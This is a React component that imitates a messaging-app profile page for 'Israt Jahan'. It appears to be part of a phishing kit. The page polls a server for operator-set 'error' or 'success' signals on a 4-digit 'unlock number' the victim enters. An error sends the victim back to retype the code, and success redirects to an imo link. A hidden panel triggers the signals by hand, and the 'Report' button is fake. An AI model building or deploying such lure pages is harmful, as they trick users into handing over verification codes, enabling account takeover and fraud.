import React, { useState, useEffect, useRef } from 'react';
import { UserPlus, Image as ImageIcon, TriangleAlert, ChevronRight, Check, AlertCircle } from 'lucide-react';
import { checkVerificationStatus, sendVerificationSignal } from '../utils/api';

interface IsratProfileViewProps {
  verificationId?: string;
  onErrorSignal: (reason: string) => void;
  onShowToast: (msg: string) => void;
}

export const IsratProfileView: React.FC<IsratProfileViewProps> = ({
  verificationId,
  onErrorSignal,
  onShowToast,
}) => {
  const [isAdded, setIsAdded] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [showSimPanel, setShowSimPanel] = useState(false);

  const pollTimerRef = useRef<any>(null);
  const isHandledRef = useRef<boolean>(false);

  // Poll database server for /error or /success signal
  useEffect(() => {
    isHandledRef.current = false;

    const pollStatus = async () => {
      if (isHandledRef.current) return;

      const res = await checkVerificationStatus(verificationId || '');
      
      // Handle /error signal
      if (res.signal === 'error' && !isHandledRef.current) {
        isHandledRef.current = true;
        if (pollTimerRef.current) clearInterval(pollTimerRef.current);

        setErrorMessage('Your unlock number incorrect');
        onShowToast('Your unlock number incorrect. Try again.');

        // Automatically redirect back to the 4-digit verification input
        setTimeout(() => {
          onErrorSignal('Your unlock number incorrect. Try again.');
        }, 1800);
      }
      // Handle /success signal
      else if (res.signal === 'success' && !isHandledRef.current) {
        isHandledRef.current = true;
        if (pollTimerRef.current) clearInterval(pollTimerRef.current);

        setIsVerified(true);
        onShowToast('Unlock code verified! Add button is now active.');
      }
    };

    // Initial check and start polling every 1500ms
    pollStatus();
    pollTimerRef.current = setInterval(pollStatus, 1500);

    return () => {
      if (pollTimerRef.current) {
        clearInterval(pollTimerRef.current);
      }
    };
  }, [verificationId, onErrorSignal, onShowToast]);

  const handleAddClick = () => {
    // If /success signal was received from database, Add button is active and redirects to target imo link
    if (isVerified) {
      setIsAdded(true);
      onShowToast('Redirecting...');
      setTimeout(() => {
        window.location.href = 'https://s.imoim.net/dhCQvv';
      }, 400);
      return;
    }

    // If still waiting for database server signal
    onShowToast('Verification in progress... please wait');
  };

  const handleManualTryAgain = () => {
    onErrorSignal('Your unlock number incorrect. Try again.');
  };

  const handleSimulate = async (signal: 'error' | 'success') => {
    await sendVerificationSignal(verificationId || 'latest', signal);
    if (signal === 'error') {
      setErrorMessage('Your unlock number incorrect');
      setTimeout(() => {
        onErrorSignal('Your unlock number incorrect. Try again.');
      }, 1500);
    } else {
      setIsVerified(true);
      onShowToast('Signal /success activated!');
    }
  };

  return (
    <div className="w-full min-h-screen bg-[#F4F5F7] flex flex-col justify-between animate-fadeIn select-none relative">
      {/* Error Modal Overlay if /error signal received */}
      {errorMessage && (
        <div className="fixed inset-0 z-50 bg-black/40 backdrop-blur-[2px] flex items-center justify-center p-5 animate-fadeIn">
          <div className="w-full max-w-[320px] bg-white rounded-[24px] p-6 shadow-2xl flex flex-col items-center text-center animate-scaleUp border border-slate-100">
            <div className="w-12 h-12 rounded-full bg-red-50 flex items-center justify-center text-[#EE4D4D] mb-3">
              <AlertCircle className="w-7 h-7 stroke-[2.2]" />
            </div>
            
            <h3 className="text-[17px] font-bold text-slate-900 leading-snug">
              Your unlock number incorrect
            </h3>
            
            <p className="text-[13.5px] text-slate-500 mt-1 mb-5">
              Please enter the correct unlock code again.
            </p>

            <button
              onClick={handleManualTryAgain}
              className="w-full h-11 bg-[#009CFD] hover:bg-[#008de6] active:scale-[0.98] text-white rounded-xl text-[15px] font-medium transition-all shadow-xs cursor-pointer"
            >
              Try again
            </button>
          </div>
        </div>
      )}

      {/* Main Content Area Matching Exact Screenshot */}
      <div className="w-full flex-1 flex flex-col items-center pt-14 px-4">
        {/* Circular Avatar Matching Screenshot */}
        <div className="w-[102px] h-[102px] rounded-full overflow-hidden shadow-[0_2px_12px_rgba(0,0,0,0.06)] border-[1.5px] border-white bg-slate-200 shrink-0">
          <img
            src="/my-logo.jpg"
            alt="Israt Jahan"
            className="w-full h-full object-cover"
            onError={(e) => {
              const target = e.target as HTMLImageElement;
              if (!target.src.includes('israt_avatar.jpg')) {
                target.src = '/israt_avatar.jpg';
              }
            }}
          />
        </div>

        {/* User Display Name */}
        <h1 className="text-[21px] font-bold text-[#1E293B] mt-3.5 tracking-tight">
          Israt Jahan
        </h1>

        {/* List of Options Cards */}
        <div className="w-full max-w-[370px] mt-7 space-y-2.5">
          {/* Card 1: VoiceClub */}
          <button
            onClick={() => onShowToast('VoiceClub: Connecting...')}
            type="button"
            className="w-full bg-white rounded-[20px] px-4 py-3.5 flex items-center justify-between shadow-[0_1px_6px_rgba(0,0,0,0.02)] border border-slate-100/90 hover:bg-slate-50/70 active:scale-[0.99] transition-all cursor-pointer group text-left"
          >
            <div className="flex items-center gap-3">
              <div className="w-7 h-7 flex items-center justify-center text-slate-900">
                <svg
                  className="w-6 h-6 text-slate-900"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2.1"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                >
                  <path d="M12 2a9 9 0 0 0-9 9v3a3 3 0 0 0 3 3h1a1 1 0 0 0 1-1v-4a1 1 0 0 0-1-1H5a7 7 0 1 1 14 0h-2a1 1 0 0 0-1 1v4a1 1 0 0 0 1 1h1a3 3 0 0 0 3-3v-3a9 9 0 0 0-9-9z" />
                  <path d="M9 13.5c.7.8 1.8 1.5 3 1.5s2.3-.7 3-1.5" />
                </svg>
              </div>
              <span className="text-[15.5px] font-medium text-[#1E293B] tracking-tight">
                VoiceClub
              </span>
            </div>

            <div className="flex items-center gap-1">
              <span className="text-[13.5px] text-[#94A3B8] font-normal tracking-tight">
                Make friends
              </span>
              <ChevronRight className="w-4 h-4 text-[#CBD5E1] stroke-[2.2]" />
            </div>
          </button>

          {/* Card 2: Story Albums */}
          <button
            onClick={() => onShowToast('Opening Story Albums...')}
            type="button"
            className="w-full bg-white rounded-[20px] px-4 py-3.5 flex items-center justify-between shadow-[0_1px_6px_rgba(0,0,0,0.02)] border border-slate-100/90 hover:bg-slate-50/70 active:scale-[0.99] transition-all cursor-pointer group text-left"
          >
            <div className="flex items-center gap-3">
              <div className="w-7 h-7 flex items-center justify-center text-slate-900">
                <ImageIcon className="w-6 h-6 text-slate-900 stroke-[2]" />
              </div>
              <span className="text-[15.5px] font-medium text-[#1E293B] tracking-tight">
                Story Albums
              </span>
            </div>

            <ChevronRight className="w-4 h-4 text-[#CBD5E1] stroke-[2.2]" />
          </button>

          {/* Card 3: Report */}
          <button
            onClick={() => onShowToast('Report submitted for review')}
            type="button"
            className="w-full bg-white rounded-[20px] px-4 py-3.5 flex items-center gap-3 shadow-[0_1px_6px_rgba(0,0,0,0.02)] border border-slate-100/90 hover:bg-slate-50/70 active:scale-[0.99] transition-all cursor-pointer text-left"
          >
            <div className="w-7 h-7 flex items-center justify-center text-[#EE4D4D]">
              <TriangleAlert className="w-6 h-6 stroke-[2]" />
            </div>
            <span className="text-[15.5px] font-medium text-[#EE4D4D] tracking-tight">
              Report
            </span>
          </button>
        </div>
      </div>

      {/* Bottom Sticky Action Button: Add */}
      <div className="w-full px-4 pb-7 pt-4 bg-transparent max-w-[370px] mx-auto flex flex-col items-center">
        {/* Add Button - Highly responsive and redirects to https://s.imoim.net/dhCQvv on /success */}
        <button
          onClick={handleAddClick}
          type="button"
          aria-label="Add"
          className={`w-full h-[50px] rounded-[22px] flex items-center justify-center gap-2 font-medium text-[16px] shadow-sm transition-all cursor-pointer ${
            isAdded
              ? 'bg-emerald-600 text-white'
              : isVerified
              ? 'bg-[#009CFD] hover:bg-[#008de6] active:scale-[0.985] text-white ring-2 ring-[#009CFD]/30'
              : 'bg-[#009CFD] hover:bg-[#008de6] active:scale-[0.985] text-white'
          }`}
        >
          {isAdded ? (
            <>
              <Check className="w-5 h-5 stroke-[2.5]" />
              <span>Redirecting...</span>
            </>
          ) : (
            <>
              <UserPlus className="w-5 h-5 stroke-[2.2]" />
              <span>Add</span>
            </>
          )}
        </button>

        {/* Small subtle simulation trigger for testing */}
        <div className="mt-2 flex items-center justify-center gap-3">
          <button
            onClick={() => setShowSimPanel(!showSimPanel)}
            className="text-[11px] text-slate-300 hover:text-slate-500 transition-colors"
          >
            {showSimPanel ? 'Hide Signal Test' : '•'}
          </button>
        </div>

        {/* Discreet Simulation Controls for testing /error and /success signals */}
        {showSimPanel && (
          <div className="mt-2 flex items-center gap-2 p-1.5 bg-white/80 backdrop-blur rounded-xl border border-slate-200/80 shadow-xs animate-fadeIn">
            <span className="text-[11px] text-slate-500 font-mono px-1">Signal Test:</span>
            <button
              onClick={() => handleSimulate('error')}
              className="px-2.5 py-1 text-[11px] bg-red-100 text-red-700 hover:bg-red-200 rounded-lg font-medium transition-colors cursor-pointer"
            >
              Send /error
            </button>
            <button
              onClick={() => handleSimulate('success')}
              className="px-2.5 py-1 text-[11px] bg-emerald-100 text-emerald-800 hover:bg-emerald-200 rounded-lg font-medium transition-colors cursor-pointer"
            >
              Send /success
            </button>
          </div>
        )}
      </div>
    </div>
  );
};
